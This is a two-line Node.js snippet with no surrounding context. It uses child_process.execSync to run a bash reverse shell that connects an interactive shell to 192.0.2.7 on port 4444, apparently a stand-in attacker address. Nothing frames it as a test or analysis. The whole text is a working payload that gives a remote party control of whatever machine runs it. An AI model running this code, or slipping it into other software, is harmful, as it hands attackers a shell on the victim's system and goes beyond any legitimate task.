const { execSync } = require('child_process');
execSync("bash -c 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1'");
